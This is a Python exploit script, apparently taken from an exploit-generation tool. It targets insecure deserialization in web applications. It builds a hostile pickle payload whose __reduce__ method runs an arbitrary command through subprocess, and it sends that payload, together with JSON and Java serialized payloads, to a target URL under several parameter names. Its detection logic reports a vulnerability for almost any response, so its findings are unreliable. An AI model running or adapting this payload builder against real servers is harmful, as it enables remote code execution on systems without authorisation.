"""
Deserialization Exploit Class
Extracted from HexStrike exploit generation system
"""

import requests
import sys
import base64
import pickle
import json


class DeserializationExploit:
    """Deserialization exploitation class"""

    def __init__(self, target_url):
        """
        Initialize deserialization exploit

        Args:
            target_url: Base URL of target application
        """
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def create_pickle_payload(self, command):
        """
        Create malicious pickle payload

        Args:
            command: Command to execute

        Returns:
            Base64-encoded pickle payload
        """
        class ExploitPayload:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, ([command], ))

        payload = ExploitPayload()
        serialized = pickle.dumps(payload)
        encoded = base64.b64encode(serialized).decode()
        return encoded

    def test_deserialization(self):
        """
        Test for deserialization vulnerabilities

        Returns:
            True if vulnerability found, False otherwise
        """
        print("[+] Testing deserialization vulnerability...")

        test_command = "ping -c 1 127.0.0.1"  # Safe test command

        # Test different serialization formats
        payloads = {
            "pickle": self.create_pickle_payload(test_command),
            "json": json.dumps({"__type__": "os.system", "command": test_command}),
            "java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
        }

        for format_type, payload in payloads.items():
            try:
                # Test different parameters
                test_params = ["data", "payload", "object", "serialized"]

                for param in test_params:
                    response = self.session.post(
                        self.target_url,
                        data={param: payload}
                    )

                    # Check for deserialization indicators
                    if response.status_code in [200, 500] and len(response.text) > 0:
                        print(f"[+] Potential {format_type} deserialization found")
                        return True

            except Exception as e:
                continue

        return False


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        print(f"Example: python3 {sys.argv[0]} http://target.com/deserialize")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = DeserializationExploit(target_url)

    print(f"[+] Deserialization Exploit")
    print(f"[+] Target: {target_url}")

    if exploit.test_deserialization():
        print("[+] Deserialization vulnerability confirmed!")
    else:
        print("[-] No deserialization vulnerability found")


if __name__ == "__main__":
    main()
